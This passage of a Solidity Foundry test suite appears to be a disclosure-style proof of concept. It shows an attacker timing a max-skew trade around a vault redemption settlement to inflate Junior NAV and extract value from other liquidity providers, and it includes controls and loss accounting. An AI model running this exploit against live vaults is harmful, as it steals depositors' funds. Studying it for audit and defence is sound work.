    /// @dev Real deposit flow: request, wait for the epoch boundary, unrelated keeper settles, LP claims shares.
    function _lpDeposit(
        TrancheVault v,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        uint256 id = _requestDeposit(v, lp, amount);
        _warpTo(pool.lpEpochStart(id));
        _routerSettle();
        uint256 claimable = v.claimableDepositRequest(id, lp);
        require(claimable == amount, "deposit not fully activated");
        vm.prank(lp);
        shares = v.claimDeposit(id, claimable, lp, lp);
    }

    function _fund(
        uint256 incA,
        uint256 incB,
        uint256 seniorAmt
    ) internal returns (Scn memory s) {
        if (incA > 0) {
            s.incDep[0] = incA;
            s.incShares[0] = _lpDeposit(juniorVault, incumbentA, incA);
        }
        if (incB > 0) {
            s.incDep[1] = incB;
            s.incShares[1] = _lpDeposit(juniorVault, incumbentB, incB);
        }
        if (seniorAmt == type(uint256).max) {
            // largest Senior deposit the vault accepts at the release 80% cap (queried, not forced)
            // (the cap drifts by a few atoms with the 1 s mark advance inside the request, hence the 1 USDG haircut)
            seniorAmt = seniorVault.maxRequestDeposit(seniorLp) - 1e6;
        }
        if (seniorAmt > 0) {
            s.seniorDep = seniorAmt;
            s.seniorShares = _lpDeposit(seniorVault, seniorLp, seniorAmt);
        }
    }

    // ------------------------------------------------------------------------------------------------ one scenario run

    function _cfg(
        Mode m,
        uint256 cycles,
        uint256 attackerDeposit
    ) internal pure returns (Cfg memory c) {
        c.mode = m;
        c.cycles = cycles;
        c.attackerDeposit = attackerDeposit;
        c.victimsExit = true;
        c.sizeBps = 10_000;
    }

    /// @dev Runs each config from the same snapshot (state is restored after every arm).
    function _arms(
        Scn memory s,
        Cfg[] memory cs
    ) internal returns (Res[] memory rs) {
        rs = new Res[](cs.length);
        for (uint256 i; i < cs.length; ++i) {
            uint256 snap = vm.snapshotState();
            rs[i] = _run(s, cs[i]);
            vm.revertToState(snap);
        }
    }

    function _run(
        Scn memory s,
        Cfg memory c
    ) internal returns (Res memory r) {
        r.cumNet = new int256[](c.cycles);
        r.cycleC = new uint256[](c.cycles);
        r.cycleF = new uint256[](c.cycles);
        uint256 t0 = vm.getBlockTimestamp();
        uint256 treasury0 = _treasuryBal();
        uint256 keeper0 = _wealth(keeper);
        uint256 honestFunded;
        if (c.honestSize > 0) {
            honestFunded = _honestOpen(c, r);
        }
        for (uint256 i; i < c.cycles; ++i) {
            _cycle(c, r, i);
        }
        if (c.honestSize > 0) {
            _honestClose(r, honestFunded);
        }
        r.elapsed = vm.getBlockTimestamp() - t0;
        r.treasuryDelta = _treasuryBal() - treasury0;
        r.keeperDelta = int256(_wealth(keeper)) - int256(keeper0);
        r.attackerNet = r.cumNet[c.cycles - 1];
        if (c.victimsExit) {
            _victimsExit(s, r);
        }
    }

    /// @dev An unrelated honest trader opens a same-side (LONG) position first. It stays open through the whole LP cycle
    ///      and is closed after the attacker is done, in the control and in the attack arm alike.
    function _honestOpen(
        Cfg memory c,
        Res memory r
    ) internal returns (uint256 funded) {
        _mark();
        r.honestNotional = c.honestSize / 1e12;
        uint256 hm = r.honestNotional * 250 / 10_000;
        funded = hm + hm / 5;
        _fundTrader(honestTrader, funded);
        _trade(honestTrader, CfdTypes.Side.LONG, c.honestSize, hm, false);
    }

    function _honestClose(
        Res memory r,
        uint256 funded
    ) internal {
        _mark();
        (uint256 sz,,,,,,) = engine.positions(honestTrader);
        _trade(honestTrader, CfdTypes.Side.LONG, sz, 0, true);
        r.honestPnl = int256(_wealth(honestTrader)) - int256(funded);
    }

    function _cycle(
        Cfg memory c,
        Res memory r,
        uint256 idx
    ) internal {
        uint256 shares = _lpDeposit(juniorVault, attacker, c.attackerDeposit); // fair NAV, no position open
        r.minted += c.attackerDeposit;

        _advance(1 hours + 1); // deposit cooldown
        _mark();
        vm.prank(attacker);
        uint256 redId = juniorVault.requestRedeem(shares, attacker, attacker);
        uint256 boundary = pool.lpEpochStart(redId);

        uint256 thirdId;
        if (c.thirdDeposit > 0) {
            thirdId = _requestDeposit(juniorVault, thirdDepositor, c.thirdDeposit);
            require(pool.lpEpochStart(thirdId) == boundary, "third deposit must mature with the redemption");
        }

        uint256 size;
        uint256 chBefore;
        if (c.mode != Mode.NoTrade) {
            (size, chBefore) = _openLeg(c, r, idx, boundary);
            if (c.mode == Mode.CloseBeforeSettle) {
                if (idx == 0) {
                    r.depthClose = pool.totalAssets();
                }
                _trade(attacker, CfdTypes.Side.LONG, size, 0, true);
                if (idx == 0) {
                    r.traderLegPnl = int256(clearinghouse.balanceAssets(attacker)) - int256(chBefore);
                }
            }
        }

        _warpTo(boundary + 5);
        r.cycleF[idx] = shares * 1e18 / juniorVault.totalSupply();
        if (idx == 0) {
            r.fWad = r.cycleF[0];
        }
        _routerSettle(); // unrelated keeper settles; the matured redemption is priced here

        if (c.thirdDeposit > 0) {
            uint256 cl = juniorVault.claimableDepositRequest(thirdId, thirdDepositor);
            vm.prank(thirdDepositor);
            r.depositorShares = juniorVault.claimDeposit(thirdId, cl, thirdDepositor, thirdDepositor);
        }
        if (c.mode == Mode.Attack) {
            _closeLeg(c, r, idx, size, chBefore);
        }
        _claimAttacker(r, redId, shares, boundary);
        r.cumNet[idx] = int256(_wealth(attacker) + r.stuckValue) - int256(r.minted);
    }

    /// @dev Open a max-skew LONG 60 s BEFORE the redemption boundary so it is open when the keeper settles.
    function _openLeg(
        Cfg memory c,
        Res memory r,
        uint256 idx,
        uint256 boundary
    ) internal returns (uint256 size, uint256 chBefore) {
        _warpTo(boundary - 60);
        _markNow();
        uint256 depth = pool.totalAssets();
        size = (_maxSize(depth) - c.honestSize) * c.sizeBps / 10_000 / LOT * LOT; // total skew (honest + attacker) <= cap
        uint256 notional = size / 1e12;
        uint256 margin = notional * 250 / 10_000;
        _fundTrader(attacker, margin + margin / 5);
        r.minted += margin + margin / 5;
        chBefore = clearinghouse.balanceAssets(attacker);
        uint256 tr0 = _treasuryBal();
        _trade(attacker, CfdTypes.Side.LONG, size, margin, false);
        (,,,,,, int256 vpi) = engine.positions(attacker);
        require(vpi > 0, "skew-increasing open must pay positive VPI");
        r.cycleC[idx] = uint256(vpi);
        if (idx == 0) {
            r.depthOpen = depth;
            r.notional = notional;
            r.vpiC = uint256(vpi);
            r.treasuryOpenDelta = _treasuryBal() - tr0;
        }
    }

    function _closeLeg(
        Cfg memory c,
        Res memory r,
        uint256 idx,
        uint256 size,
        uint256 chBefore
    ) internal {
        uint256 honestSize;
        if (c.honestShortDiv > 0) {
            honestSize = (size / c.honestShortDiv) / LOT * LOT;
            uint256 hm = (honestSize / 1e12) * 250 / 10_000;
            _fundTrader(honestTrader, hm + hm / 5);
            _trade(honestTrader, CfdTypes.Side.SHORT, honestSize, hm, false);
            (,,,,,, int256 hv) = engine.positions(honestTrader);
            r.honestVpi = hv;
        }
        (uint256 sz,,,,,,) = engine.positions(attacker);
        if (c.closePrice != 0) {
            price = c.closePrice;
        }
        if (idx == 0) {
            r.depthClose = pool.totalAssets();
            ICfdEngineTypes.ClosePreview memory pv = engineLens.previewClose(attacker, sz, price);
            r.pvVpiDelta = pv.vpiDeltaAssets;
            r.pvFee = pv.executionFeeAssets;
            r.tmpTreasury = _treasuryBal();
            r.tmpCh = clearinghouse.balanceAssets(attacker);
            r.tmpCash = settlementToken.balanceOf(address(pool));
        }
        _trade(attacker, CfdTypes.Side.LONG, sz, 0, true);
        price = P0;
        if (idx == 0) {
            r.treasuryCloseDelta = _treasuryBal() - r.tmpTreasury;
            r.traderCloseDelta = int256(clearinghouse.balanceAssets(attacker)) - int256(r.tmpCh);
            r.poolCashCloseDelta = int256(settlementToken.balanceOf(address(pool))) - int256(r.tmpCash);
            r.traderLegPnl = int256(clearinghouse.balanceAssets(attacker)) - int256(chBefore);
        }
        if (honestSize > 0) {
            _mark();
            _trade(honestTrader, CfdTypes.Side.SHORT, honestSize, 0, true);
        }
    }

    function _claimAttacker(
        Res memory r,
        uint256 redId,
        uint256 shares,
        uint256 boundary
    ) internal {
        uint256 claimShares = juniorVault.claimableRedeemRequest(redId, attacker);
        uint256 got;
        if (claimShares > 0) {
            vm.prank(attacker);
            got = juniorVault.claimRedeem(redId, claimShares, attacker, attacker);
        }
        uint256 claimed = claimShares;
        // Any remainder (Junior ratio covenant backlog) is funded at later epochs, after the close.
        for (uint256 k = 1; claimed < shares && k <= 3; ++k) {
            _warpTo(boundary + k * 1 hours + 5);
            bytes[] memory d = _ticks(vm.getBlockTimestamp());
            vm.prank(keeper);
            try router.settleLpEpoch(d) {} catch {}
            uint256 more = juniorVault.claimableRedeemRequest(redId, attacker);
            if (more > 0) {
                vm.prank(attacker);
                got += juniorVault.claimRedeem(redId, more, attacker, attacker);
                claimed += more;
            }
        }
        r.redeemAssets = got;
        r.stuckShares = 0;
        r.stuckValue = 0;
        if (claimed < shares) {
            _mark();
            r.stuckShares = shares - claimed;
            r.stuckValue = juniorVault.convertToAssets(r.stuckShares);
        }
    }

    /// @dev Victims realize ONLY through requestRedeem -> keeper settle -> claimRedeem, in a position-free epoch.
    function _victimsExit(
        Scn memory s,
        Res memory r
    ) internal {
        _advance(1 hours + 1);
        _mark();
        uint256 startAt;
        uint256[2] memory ids;
        uint256 seniorId;
        uint256 depId;
        for (uint256 i; i < 2; ++i) {
            if (s.incShares[i] == 0) continue;
            vm.prank(_inc(i));
            ids[i] = juniorVault.requestRedeem(s.incShares[i], _inc(i), _inc(i));
            startAt = _max(startAt, pool.lpEpochStart(ids[i]));
        }
        if (s.seniorShares > 0) {
            vm.prank(seniorLp);
            seniorId = seniorVault.requestRedeem(s.seniorShares, seniorLp, seniorLp);
            startAt = _max(startAt, pool.lpEpochStart(seniorId));
        }
        if (r.depositorShares > 0) {
            vm.prank(thirdDepositor);
            depId = juniorVault.requestRedeem(r.depositorShares, thirdDepositor, thirdDepositor);
            startAt = _max(startAt, pool.lpEpochStart(depId));
        }
        _warpTo(startAt + 5);
        _routerSettle();

        for (uint256 i; i < 2; ++i) {
            if (s.incShares[i] == 0) continue;
            require(juniorVault.claimableRedeemRequest(ids[i], _inc(i)) == s.incShares[i], "incumbent exit must be fully funded");
            r.incWalletBefore[i] = settlementToken.balanceOf(_inc(i));
            vm.prank(_inc(i));
            r.incRealized[i] = juniorVault.claimRedeem(ids[i], s.incShares[i], _inc(i), _inc(i));
            r.incWalletAfter[i] = settlementToken.balanceOf(_inc(i));
            require(r.incWalletAfter[i] - r.incWalletBefore[i] == r.incRealized[i], "wallet delta == claim");
        }
        if (s.seniorShares > 0) {
            require(seniorVault.claimableRedeemRequest(seniorId, seniorLp) == s.seniorShares, "senior exit must be fully funded");
            vm.prank(seniorLp);
            r.seniorRealized = seniorVault.claimRedeem(seniorId, s.seniorShares, seniorLp, seniorLp);
        }
        if (r.depositorShares > 0) {
            require(juniorVault.claimableRedeemRequest(depId, thirdDepositor) == r.depositorShares, "depositor exit must be funded");
            vm.prank(thirdDepositor);
            r.depositorRealized = juniorVault.claimRedeem(depId, r.depositorShares, thirdDepositor, thirdDepositor);
        }
        r.seedJ = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        r.seedS = seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    function _max(
        uint256 a,
        uint256 b
    ) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    // ------------------------------------------------------------------------------------------------ reporting

    function _usdg(
        uint256 a
    ) internal pure returns (string memory) {
        string memory frac = vm.toString(a % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        return string.concat(vm.toString(a / 1e6), ".", frac);
    }

    function _susdg(
        int256 a
    ) internal pure returns (string memory) {
        if (a < 0) {
            return string.concat("-", _usdg(uint256(-a)));
        }
        return _usdg(uint256(a));
    }

    function _f4(
        uint256 fWad
    ) internal pure returns (string memory) {
        uint256 x = fWad / 1e14;
        string memory frac = vm.toString(x % 10_000);
        while (bytes(frac).length < 4) {
            frac = string.concat("0", frac);
        }
        return string.concat(vm.toString(x / 10_000), ".", frac);
    }

    function _incTotal(
        Res memory r
    ) internal pure returns (uint256) {
        return r.incRealized[0] + r.incRealized[1];
    }

    function _incDepTotal(
        Scn memory s
    ) internal pure returns (uint256) {
        return s.incDep[0] + s.incDep[1];
    }

    function _kv(
        string memory sc,
        string memory k,
        string memory v
    ) internal pure {
        console2.log(string.concat("SUMMARY|", sc, "|", k, "=", v));
    }

    function _printArm(
        string memory tag,
        Scn memory s,
        Res memory r
    ) internal pure {
        console2.log(string.concat("---- ARM: ", tag));
        console2.log(string.concat("[", tag, "] f (attacker share of Junior supply) = ", _f4(r.fWad)));
        console2.log(string.concat("[", tag, "] c (open VPI charge) USDG = ", _usdg(r.vpiC), " ; notional USDG = ", _usdg(r.notional)));
        console2.log(string.concat("[", tag, "] pool depth at open USDG = ", _usdg(r.depthOpen), " ; depth at close USDG = ", _usdg(r.depthClose)));
        console2.log(string.concat("[", tag, "] attacker capital in (minted) USDG = ", _usdg(r.minted), " ; cycles = ", vm.toString(r.cumNet.length)));
        console2.log(string.concat("[", tag, "] attacker redemption payout (last cycle) USDG = ", _usdg(r.redeemAssets)));
        console2.log(string.concat("[", tag, "] attacker NET PnL USDG = ", _susdg(r.attackerNet), " ; stuck shares valued = ", _usdg(r.stuckValue)));
        console2.log(string.concat("[", tag, "] trader leg PnL (first cycle, clearinghouse delta) USDG = ", _susdg(r.traderLegPnl)));
        console2.log(string.concat("[", tag, "] treasury USDG delta = ", _usdg(r.treasuryDelta), " ; keeper wealth delta = ", _susdg(r.keeperDelta)));
        for (uint256 i; i < 2; ++i) {
            if (s.incDep[i] == 0) continue;
            string memory who = _incName(i);
            console2.log(
                string.concat(
                    "[", tag, "] ", who, " deposited USDG = ", _usdg(s.incDep[i]), " ; wallet before exit = ",
                    _usdg(r.incWalletBefore[i]), " ; wallet after exit = ", _usdg(r.incWalletAfter[i])
                )
            );
        }
        if (s.seniorDep > 0) {
            console2.log(string.concat("[", tag, "] seniorLp deposited = ", _usdg(s.seniorDep), " ; realized = ", _usdg(r.seniorRealized)));
        }
        if (r.depositorShares > 0) {
            console2.log(string.concat("[", tag, "] thirdDepositor shares minted (1e6 units) = ", vm.toString(r.depositorShares), " ; realized USDG = ", _usdg(r.depositorRealized)));
        }
    }

    /// @dev Conservation: attacker + treasury + keeper + every victim + seed holders, arm minus control, must net to ~0.
    function _sumDelta(
        Res memory ctrl,
        Res memory arm
    ) internal pure returns (int256) {
        return (arm.attackerNet - ctrl.attackerNet) + int256(arm.treasuryDelta) - int256(ctrl.treasuryDelta)
            + (arm.keeperDelta - ctrl.keeperDelta) + int256(_incTotal(arm)) - int256(_incTotal(ctrl))
            + int256(arm.depositorRealized) - int256(ctrl.depositorRealized) + int256(arm.seniorRealized)
            - int256(ctrl.seniorRealized) + int256(arm.seedJ) - int256(ctrl.seedJ) + int256(arm.seedS) - int256(ctrl.seedS)
            + (arm.honestPnl - ctrl.honestPnl);
    }

    function _printCompare(
        string memory sc,
        Scn memory s,
        Res memory ctrl,
        Res memory arm
    ) internal pure {
        uint256 incDep = _incDepTotal(s);
        int256 lossVsCtrl = int256(_incTotal(ctrl)) - int256(_incTotal(arm));
        int256 absLoss = int256(incDep) - int256(_incTotal(arm));
        uint256 fc = arm.fWad * arm.vpiC / 1e18;
        console2.log(string.concat("==== COMPARE ", sc));
        console2.log(string.concat("[", sc, "] f = ", _f4(arm.fWad), " ; c USDG = ", _usdg(arm.vpiC), " ; f*c USDG = ", _usdg(fc)));
        console2.log(string.concat("[", sc, "] incumbents deposited USDG = ", _usdg(incDep)));
        console2.log(string.concat("[", sc, "] incumbents realized (control) USDG = ", _usdg(_incTotal(ctrl))));
        console2.log(string.concat("[", sc, "] incumbents realized (attack)  USDG = ", _usdg(_incTotal(arm))));
        console2.log(string.concat("[", sc, "] LOSS VS CONTROL USDG = ", _susdg(lossVsCtrl)));
        console2.log(string.concat("[", sc, "] ABSOLUTE LOSS VS DEPOSIT (attack) USDG = ", _susdg(absLoss)));
        console2.log(string.concat("[", sc, "] control drift vs deposit (Senior coupon etc.) USDG = ", _susdg(int256(incDep) - int256(_incTotal(ctrl)))));
        console2.log(string.concat("[", sc, "] attacker NET (attack) USDG = ", _susdg(arm.attackerNet), " ; attacker NET (control) USDG = ", _susdg(ctrl.attackerNet)));
        console2.log(string.concat("[", sc, "] attacker net delta vs control USDG = ", _susdg(arm.attackerNet - ctrl.attackerNet)));
        console2.log(string.concat("[", sc, "] redemption uplift vs control USDG = ", _susdg(int256(arm.redeemAssets) - int256(ctrl.redeemAssets))));
        console2.log(string.concat("[", sc, "] conservation residual (should be ~0) USDG = ", _susdg(_sumDelta(ctrl, arm))));
        _kv(sc, "f", _f4(arm.fWad));
        _kv(sc, "c_usdg", _usdg(arm.vpiC));
        _kv(sc, "fc_usdg", _usdg(fc));
        _kv(sc, "depth_at_open_usdg", _usdg(arm.depthOpen));
        _kv(sc, "incumbents_deposited_usdg", _usdg(incDep));
        _kv(sc, "incumbents_realized_control_usdg", _usdg(_incTotal(ctrl)));
        _kv(sc, "incumbents_realized_attack_usdg", _usdg(_incTotal(arm)));
        _kv(sc, "loss_vs_control_usdg", _susdg(lossVsCtrl));
        _kv(sc, "absolute_loss_vs_deposit_usdg", _susdg(absLoss));
        _kv(sc, "attacker_net_attack_usdg", _susdg(arm.attackerNet));
        _kv(sc, "attacker_net_control_usdg", _susdg(ctrl.attackerNet));
        _kv(sc, "treasury_delta_attack_usdg", _usdg(arm.treasuryDelta));
        _kv(sc, "conservation_residual_usdg", _susdg(_sumDelta(ctrl, arm)));
    }

    /// @dev Helper: linear interpolation of the zero crossing, in centi-basis-points of adverse move.
    function _breakEvenCbp(
        int256[5] memory net
    ) internal pure returns (uint256) {
        for (uint256 i; i < 3; ++i) {
            if (net[i] > 0 && net[i + 1] <= 0) {
                return i * 200 + uint256(net[i] * 200 / (net[i] - net[i + 1]));
            }
        }
        return 0;
    }

    function _cbp(
        uint256 cbp
    ) internal pure returns (string memory) {
        string memory frac = vm.toString(cbp % 100);
        while (bytes(frac).length < 2) {
            frac = string.concat("0", frac);
        }
        return string.concat(vm.toString(cbp / 100), ".", frac);
    }

    /// @dev Mirrors the engine curve value k * s^2 / (2 D) in 6-dec assets.
    function _skewCost(
        uint256 skewAssets,
        uint256 depthAssets
    ) internal pure returns (uint256) {
        uint256 skewWad = skewAssets * 1e12;
        return (VPI_FACTOR * (skewWad * skewWad / (depthAssets * 1e12)) / 1e18 / 2) / 1e12;
    }

    function _commonAttackAsserts(
        Scn memory s,
        Res memory ctrl,
        Res memory atk
    ) internal pure {
        assertGt(atk.vpiC, 0, "open must pay positive VPI c");
        assertEq(atk.stuckShares, 0, "attacker redemption fully funded");
        for (uint256 i; i < 2; ++i) {
            if (s.incDep[i] == 0) continue;
            assertLt(atk.incRealized[i], s.incDep[i], "ABSOLUTE: unprivileged incumbent realized < its own deposit");
            assertLt(atk.incRealized[i], ctrl.incRealized[i], "incumbent realized < no-trade control");
        }
        assertGt(atk.attackerNet, 0, "attacker net > 0");
        assertGt(atk.attackerNet, ctrl.attackerNet, "attacker net above control");
    }

    // ================================================================================================ TESTS

    /// @dev Main exploit, about 1M incumbent vs 1M attacker Junior (f ~ 0.5), Junior-only pool.
    function test_Attack_UnprivilegedIncumbent_AbsoluteLoss() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 1_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("MAIN control", s, ctrl);
        _printArm("MAIN attack", s, atk);
        _printCompare("MAIN_f050", s, ctrl, atk);

        _commonAttackAsserts(s, ctrl, atk);
        assertGe(atk.fWad, 0.49e18, "f ~ 0.5");
        assertLe(atk.fWad, 0.51e18, "f ~ 0.5");
        // ABSOLUTE loss (unprivileged EOA incumbent ends below the USDG it deposited)
        assertLt(atk.incRealized[0], s.incDep[0], "incRealized < incDeposited");
        // the no-trade control leaves the incumbent whole to rounding (so the loss is caused by the attack)
        assertApproxEqAbs(ctrl.incRealized[0], s.incDep[0], 1e6, "control incumbent whole within 1 USDG");
        assertLe(ctrl.attackerNet, 0, "control: LP round trip alone does not profit");
        assertEq(ctrl.treasuryDelta, 0, "control: no fees");
        // mechanism: redemption priced with c inside Junior NAV, uplift = f*c
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        // the trader leg gets its own VPI back (loss only ~ fees), so the attacker keeps f*c
        assertLt(-atk.traderLegPnl, int256(atk.vpiC / 2), "close refunds the open VPI charge");
        // value conservation: nothing is created, attacker + treasury + keeper gain = victims lose
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 2e6, "conservation within 2 USDG");
    }

    /// @dev Negative control 1: identical LP flows, no trade.
    function test_Control_NoTrade() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](1);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        _printArm("CONTROL no-trade", s, ctrl);
        console2.log(string.concat("[CONTROL] incumbent loss vs its deposit USDG = ", _susdg(int256(s.incDep[0]) - int256(ctrl.incRealized[0]))));
        _kv("CONTROL_NoTrade", "incumbent_deposited_usdg", _usdg(s.incDep[0]));
        _kv("CONTROL_NoTrade", "incumbent_realized_usdg", _usdg(ctrl.incRealized[0]));
        _kv("CONTROL_NoTrade", "attacker_net_usdg", _susdg(ctrl.attackerNet));
        assertApproxEqAbs(ctrl.incRealized[0], s.incDep[0], 1e6, "no trade: incumbent whole within 1 USDG");
        assertLe(ctrl.attackerNet, 0, "no trade: LP round trip does not profit");
        assertGe(ctrl.attackerNet, -1e6, "no trade: round-trip rounding only");
        assertEq(ctrl.treasuryDelta, 0, "no trade: no fees");
        assertEq(ctrl.vpiC, 0, "no trade: no VPI");
    }

    /// @dev Negative control 2: the SAME open (same state, same c) but the position is closed BEFORE the settlement.
    function test_NegControl_SameTradesClosedBeforeSettlement() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](3);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6);
        cs[1] = _cfg(Mode.CloseBeforeSettle, 1, 1_000_000e6);
        cs[2] = _cfg(Mode.Attack, 1, 1_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory neg = rs[1];
        Res memory atk = rs[2];
        _printArm("NEG control (no trade)", s, ctrl);
        _printArm("NEG closed-before-settlement", s, neg);
        _printArm("NEG attack (closed after settlement)", s, atk);
        _printCompare("NEG_closed_before_settle", s, ctrl, neg);
        _printCompare("NEG_vs_attack_reference", s, ctrl, atk);

        assertEq(neg.vpiC, atk.vpiC, "same trade, same c");
        assertLt(neg.attackerNet, 0, "closed before settlement: attacker loses the fees");
        assertGe(neg.incRealized[0], ctrl.incRealized[0], "closed before settlement: incumbent not harmed");
        assertLt(int256(neg.redeemAssets) - int256(ctrl.redeemAssets), int256(neg.fWad * neg.vpiC / 1e18 / 4), "no f*c uplift");
        // the only difference between the two arms is whether the position is open at settlement
        assertGt(atk.attackerNet, 0, "closed after settlement: attacker profits");
        assertLt(atk.incRealized[0], neg.incRealized[0], "incumbent worse off than with the same trades closed pre-settlement");
        assertLt(atk.incRealized[0], s.incDep[0], "ABSOLUTE loss only in the attack arm");
    }

    /// @dev Adverse close-price move (only the attacker's close is moved; it is no longer an LP then).
    function test_PriceSensitivity() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        uint64[2] memory confs = [uint64(0), uint64(1e4)];
        uint256[2] memory be;
        for (uint256 k; k < 2; ++k) {
            confE8 = confs[k];
            int256[5] memory moveBp = [int256(0), 2, 4, 6, -2];
            Cfg[] memory cs = new Cfg[](5);
            for (uint256 j; j < 5; ++j) {
                cs[j] = _cfg(Mode.Attack, 1, 1_500_000e6);
                cs[j].victimsExit = false;
                cs[j].closePrice = j == 0 ? 0 : uint256(int256(P0) + moveBp[j] * 1e4);
            }
            Res[] memory rs = _arms(s, cs);
            int256[5] memory net;
            string memory label = string.concat("PRICE_conf", vm.toString(uint256(confs[k])));
            for (uint256 j; j < 5; ++j) {
                net[j] = rs[j].attackerNet;
                string memory mv = j == 4 ? string.concat("-2bp favorable") : string.concat("+", vm.toString(uint256(moveBp[j])), "bp adverse");
                console2.log(string.concat("[", label, "] close move ", mv, " : attacker NET USDG = ", _susdg(net[j])));
                _kv(label, string.concat("net_usdg_move_", mv), _susdg(net[j]));
            }
            be[k] = _breakEvenCbp(net);
            console2.log(string.concat("[", label, "] f = ", _f4(rs[0].fWad), " ; c USDG = ", _usdg(rs[0].vpiC), " ; notional USDG = ", _usdg(rs[0].notional)));
            console2.log(string.concat("[", label, "] BREAK-EVEN adverse move (bp) = ", _cbp(be[k])));
            _kv(label, "f", _f4(rs[0].fWad));
            _kv(label, "c_usdg", _usdg(rs[0].vpiC));
            _kv(label, "break_even_adverse_bp", _cbp(be[k]));
            assertGt(net[0], 0, "flat: profitable");
            assertGt(net[1], 0, "survives +2 bp adverse");
            assertLt(net[3], 0, "+6 bp adverse exceeds the edge");
            assertGt(net[4], net[0], "favorable move adds");
            assertGt(be[k], 300, "break-even above 3 bp");
            assertLt(be[k], 500, "break-even below 5 bp");
        }
        assertLt(be[1], be[0], "oracle confidence lowers the edge but does not remove it");
    }

    /// @dev Depth-neutral: a same-size third-party deposit keeps depth constant, so the clamp does not bind and
    ///      depth reduction is not the mechanism. The concurrent depositor is a second victim.
    function test_DepthNeutral_DepositorOverpays() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_500_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 1_500_000e6);
        cs[0].thirdDeposit = 1_500_000e6;
        cs[1].thirdDeposit = 1_500_000e6;
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("DEPTH_NEUTRAL control (no trade, same third-party deposit)", s, ctrl);
        _printArm("DEPTH_NEUTRAL attack (depth-neutral)", s, atk);
        _printCompare("DEPTH_NEUTRAL", s, ctrl, atk);

        uint256 curveAtClose = _skewCost(atk.notional, atk.depthClose);
        console2.log(string.concat("[DEPTH_NEUTRAL] unclamped close curve value at close depth USDG = ", _usdg(curveAtClose), " ; open charge c = ", _usdg(atk.vpiC)));
        console2.log(string.concat("[DEPTH_NEUTRAL] depositor shares minted control = ", vm.toString(ctrl.depositorShares), " ; attack = ", vm.toString(atk.depositorShares)));
        console2.log(string.concat("[DEPTH_NEUTRAL] depositor deposited USDG = ", _usdg(1_500_000e6), " ; realized control = ", _usdg(ctrl.depositorRealized), " ; realized attack = ", _usdg(atk.depositorRealized)));
        console2.log(string.concat("[DEPTH_NEUTRAL] depositor LOSS VS CONTROL USDG = ", _susdg(int256(ctrl.depositorRealized) - int256(atk.depositorRealized))));
        _kv("DEPTH_NEUTRAL", "depth_close_over_open_ratio_bps", vm.toString(atk.depthClose * 10_000 / atk.depthOpen));
        _kv("DEPTH_NEUTRAL", "curve_at_close_usdg", _usdg(curveAtClose));
        _kv("DEPTH_NEUTRAL", "depositor_deposited_usdg", _usdg(1_500_000e6));
        _kv("DEPTH_NEUTRAL", "depositor_realized_control_usdg", _usdg(ctrl.depositorRealized));
        _kv("DEPTH_NEUTRAL", "depositor_realized_attack_usdg", _usdg(atk.depositorRealized));
        _kv("DEPTH_NEUTRAL", "depositor_loss_vs_control_usdg", _susdg(int256(ctrl.depositorRealized) - int256(atk.depositorRealized)));

        assertApproxEqRel(atk.depthClose, atk.depthOpen, 0.01e18, "depth at close ~= depth at open");
        assertApproxEqRel(curveAtClose, atk.vpiC, 0.01e18, "close curve rebate ~= open charge without the clamp");
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        assertGt(atk.attackerNet, 0, "profitable with no depth reduction");
        assertLt(atk.depositorShares, ctrl.depositorShares, "concurrent depositor minted fewer shares (bought at the inflated NAV)");
        assertLt(atk.depositorRealized, ctrl.depositorRealized, "depositor realizes less than control");
        assertLt(atk.depositorRealized, 1_500_000e6, "depositor ABSOLUTE loss");
        // Disclosed outcome of this arm: the concurrent entrant overpays, which more than offsets the incumbent's pro-rata
        // share of the extraction, so the incumbent ends ABOVE control here and the entrant is the victim. The loss
        // lands on the Junior holders as a group (incumbent + entrant), which ends below what it deposited.
        uint256 grpDep = s.incDep[0] + 1_500_000e6;
        uint256 grpAtk = atk.incRealized[0] + atk.depositorRealized;
        uint256 grpCtrl = ctrl.incRealized[0] + ctrl.depositorRealized;
        console2.log(string.concat("[DEPTH_NEUTRAL] incumbent realized vs control USDG = ", _susdg(int256(atk.incRealized[0]) - int256(ctrl.incRealized[0])), " (positive: the incumbent is NOT the victim in this arm)"));
        console2.log(string.concat("[DEPTH_NEUTRAL] GROUP (incumbent + entrant) deposited = ", _usdg(grpDep), " ; realized attack = ", _usdg(grpAtk), " ; realized control = ", _usdg(grpCtrl)));
        console2.log(string.concat("[DEPTH_NEUTRAL] GROUP ABSOLUTE LOSS VS DEPOSIT USDG = ", _susdg(int256(grpDep) - int256(grpAtk)), " ; GROUP LOSS VS CONTROL USDG = ", _susdg(int256(grpCtrl) - int256(grpAtk))));
        _kv("DEPTH_NEUTRAL", "incumbent_realized_vs_control_usdg", _susdg(int256(atk.incRealized[0]) - int256(ctrl.incRealized[0])));
